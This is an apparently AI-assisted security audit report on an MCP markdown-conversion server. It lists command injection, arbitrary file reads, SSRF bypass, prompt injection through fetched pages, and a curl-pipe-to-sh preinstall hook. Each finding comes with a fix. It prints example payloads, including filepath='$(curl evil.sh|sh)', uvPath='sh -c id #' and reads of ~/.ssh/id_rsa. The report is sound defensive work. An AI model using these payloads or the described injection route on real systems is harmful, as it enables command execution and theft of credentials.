# Agent & MCP security report

Scanned: `/tmp/blind/c10` · 2026-11-23T20:42:46+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 1 | 2 | 1 | 1 | 0 | 0 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **10** · agent/MCP code files: **3** · agent instruction files: **0**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · filepath, uvPath and projectRoot from tool arguments are pasted into a shell command
`None:None` · ASI05 Unexpected Code Execution

Any *-to-markdown tool call puts filepath (only wrapped in double quotes, so $(...) and backticks still expand) and the undocumented uvPath argument straight into child_process.exec; filepath='$(curl evil.sh|sh)' or uvPath='sh -c id #' runs arbitrary commands. The url tools pass uvPath/projectRoot too.
> `src/server.ts:82` — `filePath: validatedArgs.filepath,`
> `src/server.ts:84` — `uvPath: validatedArgs.uvPath || process.env.UV_PATH,`
> `src/Markdownify.ts:32` — ``${uvPath} run ${markitdownPath} "${filePath}"`,`

**Fix:** Drop uvPath and projectRoot from the request schema (take them only from operator config/env), and call execFile(uvPath, ['run', markitdownPath, '--', filePath]) with no shell.

### M002 · HIGH · get-markdown-file and the file converters read any file on the host
`None:None` · ASI02 Tool Misuse and Exploitation

filepath is any absolute path with no root or extension check, so a steered call to get-markdown-file with ~/.ssh/id_rsa or ~/.aws/credentials returns the secret to the model; the converter tools likewise read any path.
> `src/server.ts:93` — `filePath: validatedArgs.filepath,`
> `src/Markdownify.ts:103` — `const text = await fs.promises.readFile(filePath, "utf-8");`

**Fix:** Resolve with fs.realpathSync and require the result to be inside an operator-configured allowed directory (path.relative not starting with '..'); for get-markdown-file only allow files this server wrote (os.tmpdir()/markdown_output_*.md).

### M003 · HIGH · Private-IP check only looks at the literal hostname; DNS names and redirects bypass it
`None:None` · ASI02 Tool Misuse and Exploitation

is_ip_private checks the hostname string without resolving it, and fetch follows redirects, so a URL whose DNS name resolves to 127.0.0.1/169.254.169.254, or a public URL that 302-redirects there, reaches internal services and returns the body to the model.
> `src/server.ts:61` — `if (is_ip_private(parsedUrl.hostname)) {`
> `src/Markdownify.ts:67` — `const response = await fetch(url);`

**Fix:** Resolve the hostname (dns.lookup all addresses) and reject private/loopback/link-local/IPv6-local results, fetch with redirect: 'manual' and re-check each hop, and pin the connection to the checked IP.

### M004 · MEDIUM · Fetched web pages / documents are returned to the model unmarked
`None:None` · 

Converted web pages, YouTube transcripts and documents go straight into the model context as plain text, so instructions hidden in them can steer the next tool call (e.g. into M001/M002).
> `src/server.ts:105` — `{ type: "text", text: result.text },`

**Fix:** Wrap returned content in clearly delimited untrusted-data markers and tell the client it is data, not instructions; fix M001/M002 so steered calls cannot do harm.

### M005 · LOW · npm preinstall pipes a remote script into sh
`None:None` · ASI04 Agentic Supply Chain

Installing the package runs an unpinned remote installer script with the installer's privileges; if that URL or the network is compromised, install-time code runs.
> `package.json:20` — `"preinstall": "./setup.sh",`
> `setup.sh:5` — `curl -LsSf https://astral.sh/uv/install.sh | sh`

**Fix:** Remove the preinstall hook; document installing uv separately or pin a versioned installer with a checksum.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
